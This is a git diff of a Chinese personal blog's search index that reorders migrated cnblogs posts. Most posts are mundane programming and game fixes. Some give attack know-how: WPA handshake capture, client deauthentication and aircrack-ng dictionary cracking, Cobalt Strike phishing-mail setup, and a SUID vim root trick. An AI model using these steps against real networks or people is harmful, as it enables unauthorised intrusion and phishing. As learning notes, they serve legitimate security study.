- <img src="1503868-20200629235703917-1989192327.png" alt loading="lazy">
-
-<p> </p>
-<p> root权限</p>
-<p> </p>
-<p>chmod u+s /usr/bin/vim.basic</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -3316,6 +3350,20 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>mysql登陆时出现ERROR 2013 (HY000) Lost connection to MySQL server at &#39;reading initial communication packet&#39;, system error 0</title>
+    <url>/2019/07/31/mysql%E7%99%BB%E9%99%86%E6%97%B6%E5%87%BA%E7%8E%B0ERROR%202013%20(HY000)%20Lost%20connection%20to%20MySQL%20server%20at%20&#39;reading%20initial%20communication%20packet&#39;,%20system%20error%200/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11279689.html">源地址：https://www.cnblogs.com/This-is-Y/p/11279689.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> 有4到5天没开mysql，这天晚上打=打开phpstudy，想进去mysql练习练习，结果丢给我这个</p>
+<p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 0</p>
+<p>错误2013 (HY000):读取初始通信包时MySQL服务器连接丢失，系统错误0</p>
+<p>windows进cmd命令行，输入server.msc，然后找到mysql的服务，重启一下就好了。</p>
+<p>（听说还有更复杂的情况，我又没碰到，关我什么事，碰到了再补上）</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>mysql只能显示部分中文问题 解决</title>
     <url>/2020/09/27/mysql%E5%8F%AA%E8%83%BD%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98%20%E8%A7%A3%E5%86%B3/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13738043.html">源地址：https://www.cnblogs.com/This-is-Y/p/13738043.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3361,20 +3409,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p> </p>
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>mysql登陆时出现ERROR 2013 (HY000) Lost connection to MySQL server at &#39;reading initial communication packet&#39;, system error 0</title>
-    <url>/2019/07/31/mysql%E7%99%BB%E9%99%86%E6%97%B6%E5%87%BA%E7%8E%B0ERROR%202013%20(HY000)%20Lost%20connection%20to%20MySQL%20server%20at%20&#39;reading%20initial%20communication%20packet&#39;,%20system%20error%200/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11279689.html">源地址：https://www.cnblogs.com/This-is-Y/p/11279689.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> 有4到5天没开mysql，这天晚上打=打开phpstudy，想进去mysql练习练习，结果丢给我这个</p>
-<p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 0</p>
-<p>错误2013 (HY000):读取初始通信包时MySQL服务器连接丢失，系统错误0</p>
-<p>windows进cmd命令行，输入server.msc，然后找到mysql的服务，重启一下就好了。</p>
-<p>（听说还有更复杂的情况，我又没碰到，关我什么事，碰到了再补上）</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -3509,6 +3543,33 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>python format() 格式化输出</title>
+    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>进制转换问题</strong></p>
+<p>二进制-Binary-b</p>
+<p>八进制-Octal-o</p>
+<p>十进制-Decimal-d</p>
+<p>十六进制-Hexadecimal-x</p>
+<p>效果如图</p>
+<img src="1503868-20201018092410558-702270383.png" alt>
+
+<p> </p>
+<p>代码👇</p>
+<p> </p>
+<p>位置匹配</p>
+<p>效果</p>
+<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
+
+<p> </p>
+<p>代码👇</p>
+<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python UDP多线程通信，以及自己加的花里胡哨、乱七八糟的东西</title>
     <url>/2021/03/12/python%20UDP%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%B7%B1%E5%8A%A0%E7%9A%84%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E3%80%81%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526761.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526761.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3553,33 +3614,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <img src="1503868-20210312222219445-1902128098.png" width="1200" loading="lazy">
 
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python format() 格式化输出</title>
-    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>进制转换问题</strong></p>
-<p>二进制-Binary-b</p>
-<p>八进制-Octal-o</p>
-<p>十进制-Decimal-d</p>
-<p>十六进制-Hexadecimal-x</p>
-<p>效果如图</p>
-<img src="1503868-20201018092410558-702270383.png" alt>
-
-<p> </p>
-<p>代码👇</p>
-<p> </p>
-<p>位置匹配</p>
-<p>效果</p>
-<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
-
-<p> </p>
-<p>代码👇</p>
-<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -3684,50 +3718,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>python爬虫使用lxml解析数据编码乱码问题</title>
-    <url>/2020/07/28/python%E7%88%AC%E8%99%AB%E4%BD%BF%E7%94%A8lxml%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13390506.html">源地址：https://www.cnblogs.com/This-is-Y/p/13390506.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>问题状况：</strong></p>
-<p>可以正常获取数据，但是结果是</p>
-<p>å·²éªè¯ å®å¨ ç¾ç</p>
-<p>这样子的乱码</p>
-<p><strong>解决方法：</strong></p>
-<p>这边的UTF-8根据网页编码情况而定</p>
-<p>看网页编码情况</p>
-<p>F12</p>
-<img src="1503868-20200728124650294-196621426.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python的if __name__==&#39;__main__&#39;的作用</title>
-    <url>/2020/02/17/python%E7%9A%84if%20__name__==&#39;__main__&#39;%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12322268.html">源地址：https://www.cnblogs.com/This-is-Y/p/12322268.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>学的比较浅显，目前只知道这一种作用</p>
-<p>在一个python文件中使用if <strong>name</strong>==’<strong>main</strong>‘:这个语句是看不出明显效果的</p>
-<p>但当你在另外一个python文件中import一个未使用if <strong>name</strong>==’<strong>main</strong>‘:的python文件时，会将这个文件执行一遍。</p>
-<p>而如果是import一个使用了 if <strong>name</strong>==’<strong>main</strong>‘: 语句的python文件，则不会执行主动执行这个python文件。</p>
-<p> </p>
-<p>简单示例一下：</p>
-<p>建立了3个文件，t1,t2,t3,其中</p>
-<p>t1：</p>
-<p>t2：</p>
-<p>t3</p>
-<p>最后运行的结果：</p>
-<img src="1503868-20200217163527179-1380410819.png" alt>
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>shiro漏洞利用_入门</title>
     <url>/2020/10/29/shiro%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8_%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13899977.html">源地址：https://www.cnblogs.com/This-is-Y/p/13899977.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3781,23 +3771,42 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
-    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>按下win键，输入语言，打开语言设置。</p>
-<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">
+    <title>python爬虫使用lxml解析数据编码乱码问题</title>
+    <url>/2020/07/28/python%E7%88%AC%E8%99%AB%E4%BD%BF%E7%94%A8lxml%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13390506.html">源地址：https://www.cnblogs.com/This-is-Y/p/13390506.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>问题状况：</strong></p>
+<p>可以正常获取数据，但是结果是</p>
+<p>å·²éªè¯ å®å¨ ç¾ç</p>
+<p>这样子的乱码</p>
+<p><strong>解决方法：</strong></p>
+<p>这边的UTF-8根据网页编码情况而定</p>
+<p>看网页编码情况</p>
+<p>F12</p>
+<img src="1503868-20200728124650294-196621426.png" alt loading="lazy">
 
 <p> </p>
-<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
-<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">
-
-<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
-<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">
-
 <p> </p>
-<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
-<p> gogogo</p>
-<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python的if __name__==&#39;__main__&#39;的作用</title>
+    <url>/2020/02/17/python%E7%9A%84if%20__name__==&#39;__main__&#39;%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12322268.html">源地址：https://www.cnblogs.com/This-is-Y/p/12322268.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>学的比较浅显，目前只知道这一种作用</p>
+<p>在一个python文件中使用if <strong>name</strong>==’<strong>main</strong>‘:这个语句是看不出明显效果的</p>
+<p>但当你在另外一个python文件中import一个未使用if <strong>name</strong>==’<strong>main</strong>‘:的python文件时，会将这个文件执行一遍。</p>
+<p>而如果是import一个使用了 if <strong>name</strong>==’<strong>main</strong>‘: 语句的python文件，则不会执行主动执行这个python文件。</p>
+<p> </p>
+<p>简单示例一下：</p>
+<p>建立了3个文件，t1,t2,t3,其中</p>
+<p>t1：</p>
+<p>t2：</p>
+<p>t3</p>
+<p>最后运行的结果：</p>
+<img src="1503868-20200217163527179-1380410819.png" alt>
 
 <p> </p>
 ]]></content>
@@ -3874,6 +3883,31 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
+    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>按下win键，输入语言，打开语言设置。</p>
+<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">
+
+<p> </p>
+<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
+<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">
+
+<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
+<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">
+
+<p> </p>
+<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
+<p> gogogo</p>
+<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>使用Cobalr strike发送钓鱼邮件</title>
     <url>/2020/06/18/%E4%BD%BF%E7%94%A8Cobalr%20strike%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13159570.html">源地址：https://www.cnblogs.com/This-is-Y/p/13159570.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3909,14 +3943,14 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> 　　这边的参数选项。</p>
 <p>　　<strong>SMTP host：</strong> 即qq邮箱SMTP服务地址，smtp.qq.com。这个可以自行百度。这里有一篇博客写了这些，但是端口号似乎有些不对，还请自行判断<a class="link" href="https://blog.csdn.net/Gents_hu/article/details/92219811">https://blog.csdn.net/Gents_hu/article/details/92219811<i class="fas fa-external-link-alt"></i></a></p>
 <p>　　<strong>SMTP Port：</strong>即允许SMTP服务的端口号。和上面的host配套来的，这边QQ邮箱的端口号是 465</p>
-<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#57;&#53;&#x32;&#x37;&#49;&#x34;&#49;&#51;&#56;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#57;&#53;&#x32;&#x37;&#49;&#x34;&#49;&#51;&#56;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
+<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#53;&#50;&#55;&#x31;&#x34;&#49;&#51;&#x38;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109;">&#x39;&#53;&#50;&#55;&#x31;&#x34;&#49;&#51;&#x38;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
 <p>　　<strong>Password（密码）：</strong>就是前面开启SMTP服务是的那串神秘代码，不是你的qq密码！不是你的qq密码！不是你的qq密码！</p>
 <p>　　<strong>Random Delay：</strong>似乎是等待随机延迟发送（我瞎猜的）。这里默认0就好了。</p>
 <p>　　<strong>Connetion：</strong>连接协议，qq邮箱SMTP服务用的ssl连接，所以这里选ssl</p>
 <p>　　配置好后大概是这个样子</p>
 <p>　　<img src="1503868-20200618201058685-518424786.png" alt loading="lazy"></p>
 <p>　　点解set保存设置。</p>
-<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#x35;&#x32;&#x37;&#x31;&#x34;&#x31;&#51;&#x38;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">&#57;&#x35;&#x32;&#x37;&#x31;&#x34;&#x31;&#51;&#x38;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#x39;&#x35;&#50;&#x37;&#49;&#52;&#49;&#x33;&#x38;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#x39;&#x35;&#50;&#x37;&#49;&#52;&#49;&#x33;&#x38;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
+<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#53;&#x32;&#x37;&#x31;&#52;&#49;&#51;&#x38;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#57;&#53;&#x32;&#x37;&#x31;&#52;&#49;&#51;&#x38;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#x39;&#53;&#50;&#x37;&#x31;&#x34;&#49;&#x33;&#56;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x39;&#53;&#50;&#x37;&#x31;&#x34;&#49;&#x33;&#56;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
 <img src="1503868-20200618195101320-369498795.png" alt loading="lazy">
 
 <p> </p>
@@ -3925,76 +3959,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 
 <p>这样就表示发送成功了。</p>
 <img src="1503868-20200618201554578-968296910.png" alt loading="lazy">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>关于WPA加密的wifi通过握手包跑字典破解</title>
-    <url>/2020/04/06/%E5%85%B3%E4%BA%8EWPA%E5%8A%A0%E5%AF%86%E7%9A%84wifi%E9%80%9A%E8%BF%87%E6%8F%A1%E6%89%8B%E5%8C%85%E8%B7%91%E5%AD%97%E5%85%B8%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12639589.html">源地址：https://www.cnblogs.com/This-is-Y/p/12639589.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>airodump-ng wlan0mon</p>
-<p>扫描，收集信息，记录BSSID，CH，ESSID</p>
-<p>然后airodump-ng -c 10（信道） –bssid xx:xx:xx:xx:xx:xx（MAC地址）-w WEP（文件名）wlan0mon</p>
-<p>现在就是等新的客户端连接该AP，连接的时候才能抓到握手包。成功抓包后是这个样子（<a class="link" href="https://blog.csdn.net/tangjikede2008/article/details/104710875/">网图，来源<i class="fas fa-external-link-alt"></i></a>）</p>
-<img src="1503868-20200405213335616-604793114.png" alt>
-
-<p> </p>
-<p> </p>
-<p> 如果是自己测试，可以用aireplay-ng –deauth 20（发送的接触认证帧数量） -a xx:xx:xx:xx:xx:xx（AP的MAC地址） wlan0mon来断开已连接客户端与AP的连接，迫使客户端重新发送握手包进行连接。</p>
-<p>但是我在kali上死活抓不到包，问了群里的老哥，说kali抓这个包看血统，既然如此那就和我等非酋无关了。所以决定去CDlinux下测试</p>
-<p>这里指一下路：<a class="link" href="http://cdlinux.net/cdlinux-2-1-1.html">http://cdlinux.net/cdlinux-2-1-1.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p>补充，在群里大佬的指示下得到一个新的强迫客户端下线的命令：aireplay-ng -0 20 –a &lt;ap mac&gt; -c &lt; mymac &gt; wlan</p>
-<p>不过在这里直接使用会出现一个问题，即wlan0mon is on channel 3, but the AP uses channel 11</p>
-<p>这是因为频道被切换，在网上查找资料后有说是内核版本原因，也有说是驱动程序问题。</p>
-<p>解决方法：先用airodump-ng找到要目标AP所在的信道，然后使用-c参数来固定一个信道扫描</p>
-<p> <img src="1503868-20200406130747772-69603794.png" alt></p>
-<p> </p>
-<p>用这个方法成功过一次，但是没有保存文件，，，，，很气</p>
-<p> 最后一通乱搞，我是用这个完成抓包的</p>
-<p>airodump-ng wlan0mon -w WEP1 -c 8</p>
-<p>另一个终端执行</p>
-<p>aireplay-ng -0 20 –a &lt;ap mac&gt; -c &lt; mymac &gt; wlan</p>
-<p>如果没有抓到，那就多执行几遍aireplay-ng或者把20换成别的更大的数字试试</p>
-<p> </p>
-<p>抓到包后，就是比较简单的跑字典了</p>
-<p>aircrack-ng -w /root/john-1.8.0/run/password.lst 1.cap</p>
-<p>因为是测试，就随便在john里面找了一个密码文件，然后在最后加上自己的wifi密码。</p>
-<p>3500跳数据，1秒都没有就出来了。。。。。</p>
-<p><img src="1503868-20200406141453544-163191272.png" alt>（最后打码的是密码）</p>
-<p> </p>
-<img src="1503868-20200406141641367-1221628472.png" alt>
-
-<p> </p>
-<p>这速度真心可以啊</p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>博客园装饰</title>
-    <url>/2020/01/18/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E8%A3%85%E9%A5%B0/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12210655.html">源地址：https://www.cnblogs.com/This-is-Y/p/12210655.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>装饰一下博客</p>
-<p>开通js什么的这些功能网上都很多很全了，这里记录找到的几个写得比较好的博客</p>
-<p>较为全面的两个：<a class="link" href="https://www.cnblogs.com/zhaopei/p/4174811.html">https://www.cnblogs.com/zhaopei/p/4174811.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link" href="https://www.cnblogs.com/guokaifeng/p/11121939.html">https://www.cnblogs.com/guokaifeng/p/11121939.html<i class="fas fa-external-link-alt"></i></a> </p>
-<p>（现在生成外链链接可能会没用，歌单上面的id其实就是外链id</p>
-<img src="1503868-20200118230136057-1795119443.png" alt>
-
-<p> </p>
-<p>可以看到这里的id和上面一样，至于其他的参数，前面两个教程都有解释</p>
-<img src="1503868-20200118230447941-838547165.png" alt>
-
-<p> </p>
-<p>有些时候发现博客园装饰出了点问题，不妨把这个禁用了 ↓↓</p>
-<img src="1503868-20200312211648481-430248655.png" alt>
 
 <p> </p>
 ]]></content>
@@ -4083,6 +4047,76 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>　　使用站长之家的PING检测,</p>
 <p>　　<img src="1503868-20190720101731429-518847773.png" alt width="946" height="430"></p>
 <p>　　如果说响应IP不同,则说明有CDN服务器,反之则没有</p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>关于WPA加密的wifi通过握手包跑字典破解</title>
+    <url>/2020/04/06/%E5%85%B3%E4%BA%8EWPA%E5%8A%A0%E5%AF%86%E7%9A%84wifi%E9%80%9A%E8%BF%87%E6%8F%A1%E6%89%8B%E5%8C%85%E8%B7%91%E5%AD%97%E5%85%B8%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12639589.html">源地址：https://www.cnblogs.com/This-is-Y/p/12639589.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>airodump-ng wlan0mon</p>
+<p>扫描，收集信息，记录BSSID，CH，ESSID</p>
+<p>然后airodump-ng -c 10（信道） –bssid xx:xx:xx:xx:xx:xx（MAC地址）-w WEP（文件名）wlan0mon</p>
+<p>现在就是等新的客户端连接该AP，连接的时候才能抓到握手包。成功抓包后是这个样子（<a class="link" href="https://blog.csdn.net/tangjikede2008/article/details/104710875/">网图，来源<i class="fas fa-external-link-alt"></i></a>）</p>
+<img src="1503868-20200405213335616-604793114.png" alt>
+
+<p> </p>
+<p> </p>
+<p> 如果是自己测试，可以用aireplay-ng –deauth 20（发送的接触认证帧数量） -a xx:xx:xx:xx:xx:xx（AP的MAC地址） wlan0mon来断开已连接客户端与AP的连接，迫使客户端重新发送握手包进行连接。</p>
+<p>但是我在kali上死活抓不到包，问了群里的老哥，说kali抓这个包看血统，既然如此那就和我等非酋无关了。所以决定去CDlinux下测试</p>
+<p>这里指一下路：<a class="link" href="http://cdlinux.net/cdlinux-2-1-1.html">http://cdlinux.net/cdlinux-2-1-1.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p>补充，在群里大佬的指示下得到一个新的强迫客户端下线的命令：aireplay-ng -0 20 –a &lt;ap mac&gt; -c &lt; mymac &gt; wlan</p>
+<p>不过在这里直接使用会出现一个问题，即wlan0mon is on channel 3, but the AP uses channel 11</p>
+<p>这是因为频道被切换，在网上查找资料后有说是内核版本原因，也有说是驱动程序问题。</p>
+<p>解决方法：先用airodump-ng找到要目标AP所在的信道，然后使用-c参数来固定一个信道扫描</p>
+<p> <img src="1503868-20200406130747772-69603794.png" alt></p>
+<p> </p>
+<p>用这个方法成功过一次，但是没有保存文件，，，，，很气</p>
+<p> 最后一通乱搞，我是用这个完成抓包的</p>
+<p>airodump-ng wlan0mon -w WEP1 -c 8</p>
+<p>另一个终端执行</p>
+<p>aireplay-ng -0 20 –a &lt;ap mac&gt; -c &lt; mymac &gt; wlan</p>
+<p>如果没有抓到，那就多执行几遍aireplay-ng或者把20换成别的更大的数字试试</p>
+<p> </p>
+<p>抓到包后，就是比较简单的跑字典了</p>
+<p>aircrack-ng -w /root/john-1.8.0/run/password.lst 1.cap</p>
+<p>因为是测试，就随便在john里面找了一个密码文件，然后在最后加上自己的wifi密码。</p>
+<p>3500跳数据，1秒都没有就出来了。。。。。</p>
+<p><img src="1503868-20200406141453544-163191272.png" alt>（最后打码的是密码）</p>
+<p> </p>
+<img src="1503868-20200406141641367-1221628472.png" alt>
+
+<p> </p>
+<p>这速度真心可以啊</p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>博客园装饰</title>
+    <url>/2020/01/18/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E8%A3%85%E9%A5%B0/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12210655.html">源地址：https://www.cnblogs.com/This-is-Y/p/12210655.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>装饰一下博客</p>
+<p>开通js什么的这些功能网上都很多很全了，这里记录找到的几个写得比较好的博客</p>
+<p>较为全面的两个：<a class="link" href="https://www.cnblogs.com/zhaopei/p/4174811.html">https://www.cnblogs.com/zhaopei/p/4174811.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/guokaifeng/p/11121939.html">https://www.cnblogs.com/guokaifeng/p/11121939.html<i class="fas fa-external-link-alt"></i></a> </p>
+<p>（现在生成外链链接可能会没用，歌单上面的id其实就是外链id</p>
+<img src="1503868-20200118230136057-1795119443.png" alt>
+
+<p> </p>
+<p>可以看到这里的id和上面一样，至于其他的参数，前面两个教程都有解释</p>
+<img src="1503868-20200118230447941-838547165.png" alt>
+
+<p> </p>
+<p>有些时候发现博客园装饰出了点问题，不妨把这个禁用了 ↓↓</p>
+<img src="1503868-20200312211648481-430248655.png" alt>
+
 <p> </p>
 ]]></content>
       <categories>
@@ -4657,17 +4691,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>渗透三字经</title>
-    <url>/2020/10/22/%E6%B8%97%E9%80%8F%E4%B8%89%E5%AD%97%E7%BB%8F/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13861334.html">源地址：https://www.cnblogs.com/This-is-Y/p/13861334.html<i class="fas fa-external-link-alt"></i></a></p>
